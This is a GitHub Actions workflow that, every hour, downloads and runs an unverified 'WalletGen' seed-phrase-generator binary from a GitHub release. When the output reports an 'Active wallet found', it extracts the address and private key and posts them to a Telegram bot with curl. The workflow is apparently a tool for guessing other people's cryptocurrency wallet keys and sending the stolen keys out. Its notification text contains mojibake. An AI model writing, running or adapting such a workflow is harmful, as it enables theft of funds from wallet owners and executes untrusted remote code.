name: Run Wallet Checker

on:
  workflow_dispatch:   # manual trigger
  schedule:
    - cron: "0 * * * *"   # optional: run every hour

jobs:
  run-checker:
    runs-on: ubuntu-latest
    steps:
      - name: Download release
        run: |
          wget https://github.com/wizdomf3lix/seed-phrase-generator/releases/download/v5%2C0/WalletGen_linux_x64.5.0-linux.tar.gz
          tar -xzf WalletGen_linux_x64.5.0-linux.tar.gz
          cd walletgen
          ./walletgen > result.txt

      - name: Extract wallet details
        id: check
        run: |
          if grep -q "Active wallet found" walletgen/result.txt; then
            echo "found=true" >> $GITHUB_OUTPUT
            # Extract address and private key lines
            addr=$(grep "Address:" walletgen/result.txt | head -n1 | cut -d' ' -f2)
            priv=$(grep "Private Key:" walletgen/result.txt | head -n1 | cut -d' ' -f3)
            echo "address=$addr" >> $GITHUB_OUTPUT
            echo "private=$priv" >> $GITHUB_OUTPUT
          else
            echo "found=false" >> $GITHUB_OUTPUT
          fi

      - name: Notify Telegram
        if: steps.check.outputs.found == 'true'
        run: |
          curl -s -X POST https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage \
          -d chat_id=${{ secrets.TELEGRAM_CHAT_ID }} \
          -d text="ðŸš¨ Active wallet found!\nAddress: ${{ steps.check.outputs.address }}\nPrivate Key: ${{ steps.check.outputs.private }}"
